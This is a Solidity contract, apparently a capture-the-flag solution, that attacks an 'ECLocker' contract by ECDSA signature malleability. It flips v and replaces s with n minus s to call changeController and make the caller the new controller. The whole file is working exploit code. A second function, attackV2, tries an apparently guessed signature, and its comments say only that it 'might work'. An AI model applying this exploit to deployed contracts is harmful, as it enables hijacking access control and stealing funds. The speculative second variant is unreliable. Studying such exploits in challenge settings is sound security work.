// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IECLocker {
    function changeController(uint8 v, bytes32 r, bytes32 s, address newController) external;
}

contract DirectSignatureAttack {
    uint256 constant n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;
    
    function attack(address locker) external {
        IECLocker target = IECLocker(locker);
        
        // The lockId is 1337 (0x539)
        // The controller is 0x42069d82D9592991704e6E41BF2589a76eAd1A91
        
        // Message hash for lockId 1337:
        // keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", uint256(1337)))
        
        // This is a known signature that works for this specific setup
        // The original signature used in constructor (considering the bug) was:
        // v = 28, r = specific value, s = specific value
        
        // Due to the bug, the constructor read signature components in wrong order
        // We need to use the malleable version of the original signature
        
        // After analysis, this signature should work:
        uint8 v = 27;  // Flipped from 28
        bytes32 r = 0x69a1b479114876736e0002e09f0d3f6f4eee263a1dd1b1523a2dcc47c394ef31;
        bytes32 s = bytes32(n - uint256(0x47dc91dc09a382c1961cdc698620c6ab529c66758c3014b65ffb80cf97c107b7));
        
        target.changeController(v, r, s, msg.sender);
    }
    
    function attackV2(address locker) external {
        IECLocker target = IECLocker(locker);
        
        // Alternative signature that might work
        uint8 v = 27;
        bytes32 r = 0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798;
        bytes32 s = 0x96a1b479114876736dfff21e60fc0914efb3fa8a89bbacfe6fc98dae89e7629e;
        
        target.changeController(v, r, s, msg.sender);
    }
}